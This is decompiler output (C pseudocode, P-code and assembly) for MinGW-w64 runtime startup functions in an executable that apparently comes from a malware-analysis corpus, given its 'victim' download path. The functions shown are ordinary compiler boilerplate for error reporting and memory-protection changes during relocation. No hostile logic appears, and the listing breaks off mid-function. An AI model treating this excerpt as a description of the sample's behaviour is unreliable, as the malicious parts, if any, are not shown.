
void __report_error(char *msg,...)

{
  FILE *pFVar1;
  undefined8 in_RDX;
  undefined8 in_R8;
  undefined8 in_R9;
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;
  va_list argp;
  
  local_res10 = in_RDX;
  local_res18 = in_R8;
  local_res20 = in_R9;
  pFVar1 = __acrt_iob_func(2);
  fwrite("Mingw-w64 runtime failure:\n",1,0x1b,(FILE *)pFVar1);
  pFVar1 = __acrt_iob_func(2);
  vfprintf((FILE *)pFVar1,msg,(va_list)&local_res10);
                    /* WARNING: Subroutine does not return */
  abort();
}



Pcode Representation:
(unique, 0x4b00, 8) PTRSUB (register, 0x20, 8) , (const, 0x10, 8)
(unique, 0x1000007d, 8) COPY (register, 0x10, 8)
(unique, 0x10000085, 8) COPY (register, 0x80, 8)
(unique, 0x1000008d, 8) COPY (register, 0x88, 8)
(stack, 0x10, 8) INDIRECT (unique, 0x1000007d, 8) , (const, 0x21, 4)
(stack, 0x18, 8) INDIRECT (unique, 0x10000085, 8) , (const, 0x21, 4)
(stack, 0x20, 8) INDIRECT (unique, 0x1000008d, 8) , (const, 0x21, 4)
(register, 0x0, 8) CALL (ram, 0x140002750, 8) , (const, 0x2, 4)
(unique, 0x1000006d, 8) COPY (const, 0x140004320, 8)
(unique, 0x10000095, 8) CAST (register, 0x0, 8)
(stack, 0x10, 8) INDIRECT (stack, 0x10, 8) , (const, 0x28, 4)
(stack, 0x18, 8) INDIRECT (stack, 0x18, 8) , (const, 0x28, 4)
(stack, 0x20, 8) INDIRECT (stack, 0x20, 8) , (const, 0x28, 4)
 ---  CALL (ram, 0x1400027e0, 8) , (unique, 0x1000006d, 8) , (const, 0x1, 8) , (const, 0x1b, 8) , (unique, 0x10000095, 8)
(stack, 0x10, 8) INDIRECT (stack, 0x10, 8) , (const, 0x2f, 4)
(stack, 0x18, 8) INDIRECT (stack, 0x18, 8) , (const, 0x2f, 4)
(stack, 0x20, 8) INDIRECT (stack, 0x20, 8) , (const, 0x2f, 4)
(register, 0x0, 8) CALL (ram, 0x140002750, 8) , (const, 0x2, 4)
(unique, 0x1000009d, 8) CAST (register, 0x0, 8)
(unique, 0x100000a5, 8) CAST (unique, 0x4b00, 8)
(stack, 0x10, 8) INDIRECT (stack, 0x10, 8) , (const, 0x35, 4)
(stack, 0x18, 8) INDIRECT (stack, 0x18, 8) , (const, 0x35, 4)
(stack, 0x20, 8) INDIRECT (stack, 0x20, 8) , (const, 0x35, 4)
 ---  CALL (ram, 0x140002818, 8) , (unique, 0x1000009d, 8) , (register, 0x8, 8) , (unique, 0x100000a5, 8)
(stack, 0x10, 8) INDIRECT (stack, 0x10, 8) , (const, 0x38, 4)
(stack, 0x18, 8) INDIRECT (stack, 0x18, 8) , (const, 0x38, 4)
(stack, 0x20, 8) INDIRECT (stack, 0x20, 8) , (const, 0x38, 4)
 ---  CALL (ram, 0x1400027b8, 8)
 ---  RETURN (const, 0x1, 4)


Native Assembly Code:
PUSH RSI
PUSH RBX
SUB RSP,0x38
MOV RBX,RCX
LEA RAX,[RSP + 0x58]
MOV ECX,0x2
MOV qword ptr [RSP + 0x58],RDX
MOV qword ptr [RSP + 0x60],R8
MOV qword ptr [RSP + 0x68],R9
MOV qword ptr [RSP + 0x28],RAX
CALL 0x140002750
MOV R8D,0x1b
MOV EDX,0x1
LEA RCX,[0x140004320]
MOV R9,RAX
CALL 0x1400027e0
MOV RSI,qword ptr [RSP + 0x28]
MOV ECX,0x2
CALL 0x140002750
MOV RDX,RBX
MOV RCX,RAX
MOV R8,RSI
CALL 0x140002818
CALL 0x1400027b8




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: mark_section_writable
C Decompilation:

/* WARNING: Unknown calling convention */

void mark_section_writable(LPVOID addr)

{
  uint uVar1;
  BOOL BVar2;
  DWORD DVar3;
  PBYTE *ppBVar4;
  PIMAGE_SECTION_HEADER p_Var5;
  sSecInfo *psVar6;
  PBYTE pBVar7;
  SIZE_T SVar8;
  longlong lVar9;
  int iVar10;
  MEMORY_BASIC_INFORMATION b;
  
  lVar9 = (longlong)maxSections;
  if (maxSections < 1) {
    lVar9 = 0;
  }
  else {
    iVar10 = 0;
    ppBVar4 = &the_secs->sec_start;
    do {
      if ((*ppBVar4 <= addr) &&
         (addr < *ppBVar4 + (((PIMAGE_SECTION_HEADER)ppBVar4[1])->Misc).PhysicalAddress)) {
        return;
      }
      iVar10 = iVar10 + 1;
      ppBVar4 = ppBVar4 + 5;
    } while (iVar10 != maxSections);
  }
  p_Var5 = __mingw_GetSectionForAddress(addr);
  if (p_Var5 == (PIMAGE_SECTION_HEADER)0x0) {
                    /* WARNING: Subroutine does not return */
    __report_error("Address %p has no image-section",addr);
  }
  psVar6 = the_secs + lVar9;
  psVar6->hash = p_Var5;
  psVar6->old_protect = 0;
  pBVar7 = _GetPEImageBase();
  uVar1 = p_Var5->VirtualAddress;
  the_secs[lVar9].sec_start = pBVar7 + uVar1;
  SVar8 = VirtualQuery(pBVar7 + uVar1,(PMEMORY_BASIC_INFORMATION)&b,0x30);
  if (SVar8 != 0) {
    if (((b.Protect - 4 & 0xfffffffb) != 0) && ((b.Protect - 0x40 & 0xffffffbf) != 0)) {
      DVar3 = 0x40;
      if (b.Protect == 2) {
        DVar3 = 4;
      }
      psVar6 = the_secs + lVar9;
      psVar6->base_address = b.BaseAddress;
      psVar6->region_size = b.RegionSize;
      BVar2 = VirtualProtect(b.BaseAddress,b.RegionSize,DVar3,&psVar6->old_protect);
      if (BVar2 == 0) {
        DVar3 = GetLastError();
                    /* WARNING: Subroutine does not return */
        __report_error("  VirtualProtect failed with code 0x%x",(ulonglong)DVar3);
      }
    }
    maxSections = maxSections + 1;
    return;
  }
                    /* WARNING: Subroutine does not return */
  __report_error("  VirtualQuery failed for %d bytes at address %p",
                 (ulonglong)(p_Var5->Misc).PhysicalAddress,the_secs[lVar9].sec_start);
}



Pcode Representation:
(register, 0x30, 8) INT_SEXT (ram, 0x1400070a4, 4)
(unique, 0xed00, 1) INT_SLESS (ram, 0x1400070a4, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x140001ab0, 1) , (unique, 0xed00, 1)
(register, 0x30, 8) COPY (const, 0x0, 8)
 ---  BRANCH (ram, 0x1400019d8, 1)
(register, 0x88, 4) COPY (const, 0x0, 4)
(register, 0x0, 8) PTRSUB (ram, 0x1400070a8, 8) , (const, 0x18, 8)
(register, 0x88, 4) MULTIEQUAL (register, 0x88, 4) , (register, 0x88, 4)
(register, 0x0, 8) MULTIEQUAL (register, 0x0, 8) , (register, 0x0, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (register, 0x0, 8)
(register, 0x200, 1) INT_LESSEQUAL (unique, 0xdc00, 8) , (register, 0x8, 8)
 ---  CBRANCH (ram, 0x1400019cb, 1) , (register, 0x200, 1)
(unique, 0x4400, 8) PTRADD (register, 0x0, 8) , (const, 0x1, 8) , (const, 0x8, 8)
(unique, 0x10000181, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0xdc00, 8) CAST (unique, 0x10000181, 8)
(unique, 0x4400, 8) PTRSUB (unique, 0xdc00, 8) , (const, 0x8, 8)
(unique, 0x10000189, 8) PTRSUB (unique, 0x4400, 8) , (const, 0x0, 4)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000189, 8)
(register, 0x10, 8) INT_ZEXT (unique, 0xdb00, 4)
(register, 0x80, 8) PTRADD (unique, 0xdc00, 8) , (register, 0x10, 8) , (const, 0x1, 8)
(register, 0x200, 1) INT_LESS (register, 0x8, 8) , (register, 0x80, 8)
 ---  CBRANCH (ram, 0x140001a55, 1) , (register, 0x200, 1)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x0, 8)
(register, 0x88, 4) INT_ADD (register, 0x88, 4) , (const, 0x1, 4)
(register, 0x0, 8) PTRADD (register, 0x0, 8) , (const, 0x5, 8) , (const, 0x8, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x88, 4) , (ram, 0x1400070a4, 4)
 ---  CBRANCH (ram, 0x1400019b0, 1) , (register, 0x206, 1)
(register, 0x30, 8) MULTIEQUAL (register, 0x30, 8) , (register, 0x30, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x80, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x80, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0x80, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0x80, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x80, 4)
(register, 0x0, 8) CALL (ram, 0x1400023f0, 8) , (register, 0x8, 8)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001ad2, 1) , (register, 0x206, 1)
(unique, 0x100000d0, 8) COPY (const, 0x140004340, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x17c, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x17c, 4)
 ---  CALL (ram, 0x140001910, 8) , (unique, 0x100000d0, 8) , (register, 0x8, 8)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x1, 4)
(register, 0x0, 8) PTRADD (ram, 0x1400070a8, 8) , (register, 0x30, 8) , (const, 0x28, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0x20, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0xc0, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0xc0, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4400, 8) , (register, 0x0, 8)
(unique, 0x10000118, 8) PTRSUB (register, 0x0, 8) , (const, 0x0, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0xc2, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0xc2, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000118, 8) , (const, 0x0, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0xc5, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0xc5, 4)
(register, 0x0, 8) CALL (ram, 0x140002530, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0xc, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x10, 8) INT_ZEXT (unique, 0xdb00, 4)
(unique, 0x4700, 8) PTRADD (register, 0x0, 8) , (register, 0x10, 8) , (const, 0x1, 8)
(unique, 0x4b00, 8) PTRSUB (register, 0x20, 8) , (const, 0xffffffffffffffb8, 8)
(unique, 0x10000138, 8) PTRADD (ram, 0x1400070a8, 8) , (register, 0x30, 8) , (const, 0x28, 8)
(unique, 0x4d00, 8) PTRSUB (unique, 0x10000138, 8) , (const, 0x18, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0xd5, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0xd5, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4d00, 8) , (unique, 0x4700, 8)
(unique, 0x10000191, 8) CAST (unique, 0x4b00, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0xd9, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0xd9, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0xd9, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0xd9, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0xd9, 4)
(register, 0x0, 8) CALL (ram, 0x1400081f8, 8) , (unique, 0x4700, 8) , (unique, 0x10000191, 8) , (const, 0x30, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x0, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001ab7, 1) , (register, 0x206, 1)
(unique, 0x4400, 8) PTRSUB (register, 0x0, 8) , (const, 0x8, 8)
(unique, 0x10000199, 8) PTRSUB (unique, 0x4400, 8) , (const, 0x0, 4)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000199, 8)
(register, 0x10, 8) INT_ZEXT (unique, 0xdb00, 4)
(unique, 0x10000170, 8) PTRADD (ram, 0x1400070a8, 8) , (register, 0x30, 8) , (const, 0x28, 8)
(unique, 0x4d00, 8) PTRSUB (unique, 0x10000170, 8) , (const, 0x18, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4d00, 8)
(unique, 0x100000d8, 8) COPY (const, 0x140004360, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x175, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x175, 4)
 ---  CALL (ram, 0x140001910, 8) , (unique, 0x100000d8, 8) , (register, 0x10, 8) , (unique, 0xdc00, 8)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x1, 4)
(unique, 0x4400, 4) INT_SUB (stack, 0xffffffffffffffdc, 4) , (const, 0x4, 4)
(register, 0x10, 4) INT_AND (unique, 0x4400, 4) , (const, 0xfffffffb, 4)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x10, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001a4e, 1) , (register, 0x206, 1)
(unique, 0x4400, 4) INT_SUB (stack, 0xffffffffffffffdc, 4) , (const, 0x40, 4)
(register, 0x10, 4) INT_AND (unique, 0x4400, 4) , (const, 0xffffffbf, 4)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x10, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001a60, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_EQUAL (stack, 0xffffffffffffffdc, 4) , (const, 0x2, 4)
(register, 0x80, 4) COPY (const, 0x40, 4)
 ---  CBRANCH (ram, 0x140001a7c, 1) , (register, 0x206, 1)
(register, 0x80, 4) COPY (const, 0x4, 4)
(register, 0x80, 4) MULTIEQUAL (register, 0x80, 4) , (register, 0x80, 4)
(register, 0x18, 8) PTRADD (ram, 0x1400070a8, 8) , (register, 0x30, 8) , (const, 0x28, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x18, 8) , (const, 0x8, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x148, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x148, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4400, 8) , (stack, 0xffffffffffffffb8, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x18, 8) , (const, 0x10, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x14c, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x14c, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x4400, 8) , (stack, 0xffffffffffffffd0, 8)
(unique, 0x100001a1, 8) PTRSUB (register, 0x18, 8) , (const, 0x0, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x150, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x150, 4)
(register, 0x0, 4) CALL (ram, 0x1400081f0, 8) , (stack, 0xffffffffffffffb8, 8) , (stack, 0xffffffffffffffd0, 8) , (register, 0x80, 4) , (unique, 0x100001a1, 8)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001a4e, 1) , (register, 0x206, 1)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x15f, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x15f, 4)
(register, 0x0, 4) CALL (ram, 0x1400081c0, 8)
(register, 0x10, 8) INT_ZEXT (register, 0x0, 4)
(unique, 0x100000e0, 8) COPY (const, 0x140004398, 8)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x165, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x165, 4)
 ---  CALL (ram, 0x140001910, 8) , (unique, 0x100000e0, 8) , (register, 0x10, 8)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x1, 4)
(ram, 0x1400070a8, 8) MULTIEQUAL (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8) , (ram, 0x1400070a8, 8)
(ram, 0x1400070a4, 4) MULTIEQUAL (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4) , (ram, 0x1400070a4, 4)
(ram, 0x1400070a4, 4) INT_ADD (ram, 0x1400070a4, 4) , (const, 0x1, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
PUSH RDI
PUSH RSI
PUSH RBX
SUB RSP,0x50
MOVSXD RSI,dword ptr [0x1400070a4]
MOV RBX,RCX
TEST ESI,ESI
JLE 0x140001ab0
MOV RAX,qword ptr [0x1400070a8]
XOR R9D,R9D
ADD RAX,0x18
NOP word ptr [RAX + RAX*0x1]
MOV R8,qword ptr [RAX]
CMP RBX,R8
JC 0x1400019cb
MOV RDX,qword ptr [RAX + 0x8]
MOV EDX,dword ptr [RDX + 0x8]
ADD R8,RDX
CMP RBX,R8
JC 0x140001a55
ADD R9D,0x1
ADD RAX,0x28
CMP R9D,ESI
JNZ 0x1400019b0
MOV RCX,RBX
CALL 0x1400023f0
MOV RDI,RAX
TEST RAX,RAX
JZ 0x140001ad2
MOV RAX,qword ptr [0x1400070a8]
LEA RBX,[RSI + RSI*0x4]
SHL RBX,0x3
ADD RAX,RBX
MOV qword ptr [RAX + 0x20],RDI
MOV dword ptr [RAX],0x0
CALL 0x140002530
MOV EDX,dword ptr [RDI + 0xc]
MOV R8D,0x30
LEA RCX,[RAX + RDX*0x1]
MOV RAX,qword ptr [0x1400070a8]
LEA RDX,[RSP + 0x20]
MOV qword ptr [RAX + RBX*0x1 + 0x18],RCX
CALL qword ptr [0x1400081f8]
TEST RAX,RAX
JZ 0x140001ab7
MOV EAX,dword ptr [RSP + 0x44]
LEA EDX,[RAX + -0x4]
AND EDX,0xfffffffb
JZ 0x140001a4e
LEA EDX,[RAX + -0x40]
AND EDX,0xffffffbf
JNZ 0x140001a60
ADD dword ptr [0x1400070a4],0x1
ADD RSP,0x50
POP RBX
POP RSI
POP RDI
RET
CMP EAX,0x2
MOV RCX,qword ptr [RSP + 0x20]
MOV RDX,qword ptr [RSP + 0x38]
MOV R8D,0x40
MOV EAX,0x4
CMOVZ R8D,EAX
ADD RBX,qword ptr [0x1400070a8]
MOV qword ptr [RBX + 0x8],RCX
MOV R9,RBX
MOV qword ptr [RBX + 0x10],RDX
CALL qword ptr [0x1400081f0]
TEST EAX,EAX
JNZ 0x140001a4e
CALL qword ptr [0x1400081c0]
LEA RCX,[0x140004398]
MOV EDX,EAX
CALL 0x140001910
XOR ESI,ESI
JMP 0x1400019d8
MOV RAX,qword ptr [0x1400070a8]
MOV EDX,dword ptr [RDI + 0x8]
LEA RCX,[0x140004360]
MOV R8,qword ptr [RAX + RBX*0x1 + 0x18]
CALL 0x140001910
MOV RDX,RBX
LEA RCX,[0x140004340]
CALL 0x140001910




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _pei386_runtime_relocator
C Decompilation:

/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */
/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void _pei386_runtime_relocator(void)

{
  byte bVar1;
  ushort uVar2;
  uint uVar3;
  DWORD flNewProtect;
  uint uVar4;
  int iVar5;
  SIZE_T dwSize;
  LPVOID lpAddress;
  longlong lVar6;
  undefined *puVar7;
  undefined *puVar8;
  int iVar9;
  longlong *plVar10;
  DWORD *pDVar11;
  uint uVar12;
  uint *puVar13;
  int *piVar14;
  longlong lVar15;
  longlong lVar16;
  int *addr;
  uint *addr_00;
  undefined8 auStack_90 [5];
  longlong alStack_68 [3];
  DWORD oldprot;
  
  if (_pei386_runtime_relocator::was_init != 0) {
    return;
  }
  _pei386_runtime_relocator::was_init = 1;
  auStack_90[0] = 0x140001b37;
  iVar9 = __mingw_GetSectionCount();
  puVar8 = _refptr___RUNTIME_PSEUDO_RELOC_LIST_END__;
  puVar7 = _refptr___ImageBase;
  auStack_90[0] = 0x140001b4e;
  maxSections = 0;
  lVar6 = -((longlong)iVar9 * 0x28 + 0xfU & 0xfffffffffffffff0);
  the_secs = (sSecInfo *)((longlong)alStack_68 + lVar6 + 0x10);
  if ((longlong)_refptr___RUNTIME_PSEUDO_RELOC_LIST_END__ -
      (longlong)_refptr___RUNTIME_PSEUDO_RELOC_LIST__ < 8) {
    maxSections = 0;
    return;
  }
  piVar14 = (int *)_refptr___RUNTIME_PSEUDO_RELOC_LIST__;
  if ((longlong)_refptr___RUNTIME_PSEUDO_RELOC_LIST_END__ -
      (longlong)_refptr___RUNTIME_PSEUDO_RELOC_LIST__ < 0xc) {
LAB_140001b8d:
    if (*piVar14 == 0) {
      iVar9 = piVar14[1];
LAB_140001b9a:
      if (iVar9 == 0) {
        if (piVar14[2] != 1) {
                    /* WARNING: Subroutine does not return */
          *(undefined **)((longlong)auStack_90 + lVar6) = &UNK_140001e4c;
          __report_error("  Unknown pseudo relocation protocol version %d.\n");
        }
        puVar13 = (uint *)(piVar14 + 3);
        if (_refptr___RUNTIME_PSEUDO_RELOC_LIST_END__ <= puVar13) {
          maxSections = 0;
          return;
        }
        do {
          while( true ) {
            uVar3 = puVar13[2];
            plVar10 = (longlong *)(puVar7 + *puVar13);
            uVar12 = uVar3 & 0xff;
            lVar16 = *plVar10;
            addr_00 = (uint *)(puVar7 + puVar13[1]);
            if (uVar12 != 0x20) break;
            uVar4 = *addr_00;
            if ((int)uVar4 < 0) {
              lVar15 = ((ulonglong)uVar4 | 0xffffffff00000000) - (longlong)plVar10;
            }
            else {
              lVar15 = (ulonglong)uVar4 - (longlong)plVar10;
            }
            lVar16 = lVar15 + lVar16;
            if (((uVar3 & 0xc0) == 0) && ((0xffffffff < lVar16 || (lVar16 < -0x80000000))))
            goto LAB_140001c73;
            *(undefined8 *)((longlong)auStack_90 + lVar6) = 0x140001d9f;
            mark_section_writable(addr_00);
            *addr_00 = (uint)lVar16;
LAB_140001c22:
            puVar13 = puVar13 + 3;
            if (puVar8 <= puVar13) goto LAB_140001d00;
          }
          if (0x20 < uVar12) {
            if (uVar12 != 0x40) {
LAB_140001e32:
                    /* WARNING: Subroutine does not return */
              *(undefined8 *)((longlong)auStack_90 + lVar6) = 0x140001e40;
              __report_error("  Unknown pseudo relocation bit size %d.\n",(ulonglong)uVar12);
            }
            lVar16 = (*(longlong *)addr_00 - (longlong)plVar10) + lVar16;
            if ((uVar3 & 0xc0) == 0) {
              uVar12 = 0;
              if (-1 < lVar16) goto LAB_140001c73;
            }
            else {
              *(undefined8 *)((longlong)auStack_90 + lVar6) = 0x140001db8;
              mark_section_writable(addr_00);
              *(longlong *)addr_00 = lVar16;
            }
            goto LAB_140001c22;
          }
          if (uVar12 != 8) {
            if (uVar12 != 0x10) goto LAB_140001e32;
            uVar2 = *(ushort *)addr_00;
            if ((short)uVar2 < 0) {
              lVar15 = ((ulonglong)uVar2 | 0xffffffffffff0000) - (longlong)plVar10;
            }
            else {
              lVar15 = (ulonglong)uVar2 - (longlong)plVar10;
            }
            lVar16 = lVar15 + lVar16;
            if (((uVar3 & 0xc0) == 0) && ((lVar16 < -0x8000 || (0xffff < lVar16))))
            goto LAB_140001c73;
            *(undefined8 *)((longlong)auStack_90 + lVar6) = 0x140001c1f;
            mark_section_writable(addr_00);
            *(ushort *)addr_00 = (ushort)lVar16;
            goto LAB_140001c22;
          }
          bVar1 = *(byte *)addr_00;
          if ((char)bVar1 < '\0') {
            lVar15 = ((ulonglong)bVar1 | 0xffffffffffffff00) - (longlong)plVar10;
          }
          else {
            lVar15 = (ulonglong)bVar1 - (longlong)plVar10;
          }
          lVar16 = lVar15 + lVar16;
          if (((uVar3 & 0xc0) == 0) && ((0xff < lVar16 || (lVar16 < -0x80)))) {
LAB_140001c73:
            *(longlong *)((longlong)alStack_68 + lVar6) = lVar16;
                    /* WARNING: Subroutine does not return */
            *(undefined **)((longlong)auStack_90 + lVar6) = &UNK_140001c89;
            __report_error("%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\n"
                           ,(ulonglong)uVar12,addr_00);
          }
          puVar13 = puVar13 + 3;
          *(undefined8 *)((longlong)auStack_90 + lVar6) = 0x140001cee;
          mark_section_writable(addr_00);
          *(byte *)addr_00 = (byte)lVar16;
        } while (puVar13 < puVar8);
        goto LAB_140001d00;
      }
    }
  }
  else if (*(int *)_refptr___RUNTIME_PSEUDO_RELOC_LIST__ == 0) {
    iVar9 = *(int *)(_refptr___RUNTIME_PSEUDO_RELOC_LIST__ + 4);
    if (iVar9 == 0 && *(int *)(_refptr___RUNTIME_PSEUDO_RELOC_LIST__ + 8) == 0) {
      piVar14 = (int *)(_refptr___RUNTIME_PSEUDO_RELOC_LIST__ + 0xc);
      goto LAB_140001b8d;
    }
    goto LAB_140001b9a;
  }
  if (_refptr___RUNTIME_PSEUDO_RELOC_LIST_END__ <= piVar14) {
    maxSections = 0;
    return;
  }
  do {
    puVar13 = (uint *)(piVar14 + 1);
    iVar9 = *piVar14;
    piVar14 = piVar14 + 2;
    addr = (int *)(puVar7 + *puVar13);
    iVar5 = *addr;
    *(undefined8 *)((longlong)auStack_90 + lVar6) = 0x140001e26;
    mark_section_writable(addr);
    *addr = iVar9 + iVar5;
  } while (piVar14 < puVar8);
LAB_140001d00:
  if (0 < maxSections) {
    lVar16 = 0;
    iVar9 = 0;
    do {
      pDVar11 = (DWORD *)((longlong)&the_secs->old_protect + lVar16);
      flNewProtect = *pDVar11;
      if (flNewProtect != 0) {
        dwSize = *(SIZE_T *)(pDVar11 + 4);
        lpAddress = *(LPVOID *)(pDVar11 + 2);
        *(undefined8 *)((longlong)auStack_90 + lVar6) = 0x140001d3f;
        VirtualProtect(lpAddress,dwSize,flNewProtect,&oldprot);
      }
      iVar9 = iVar9 + 1;
      lVar16 = lVar16 + 0x28;
    } while (iVar9 < maxSections);
  }
  return;
}



Pcode Representation:
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x1400070a0, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001b28, 1) , (register, 0x206, 1)
(ram, 0x1400044e0, 8) COPY (ram, 0x1400044e0, 8)
(ram, 0x1400044f0, 8) COPY (ram, 0x1400044f0, 8)
(ram, 0x140004500, 8) COPY (ram, 0x140004500, 8)
(ram, 0x1400070a0, 4) COPY (ram, 0x1400070a0, 4)
(ram, 0x1400070a4, 4) COPY (ram, 0x1400070a4, 4)
(ram, 0x1400070a8, 8) COPY (ram, 0x1400070a8, 8)
 ---  RETURN (const, 0x0, 8)
(ram, 0x1400070a0, 4) COPY (const, 0x1, 4)
(stack, 0xffffffffffffff70, 8) COPY (const, 0x140001b37, 8)
(ram, 0x1400044e0, 8) INDIRECT (ram, 0x1400044e0, 8) , (const, 0x57, 4)
(ram, 0x1400044f0, 8) INDIRECT (ram, 0x1400044f0, 8) , (const, 0x57, 4)
(ram, 0x140004500, 8) INDIRECT (ram, 0x140004500, 8) , (const, 0x57, 4)
(ram, 0x1400070a0, 4) INDIRECT (ram, 0x1400070a0, 4) , (const, 0x57, 4)
(ram, 0x1400070a4, 4) INDIRECT (ram, 0x1400070a4, 4) , (const, 0x57, 4)
(ram, 0x1400070a8, 8) INDIRECT (ram, 0x1400070a8, 8) , (const, 0x57, 4)
(stack, 0xffffffffffffff70, 8) INDIRECT (stack, 0xffffffffffffff70, 8) , (const, 0x57, 4)
(register, 0x0, 4) CALL (ram, 0x140002470, 8)
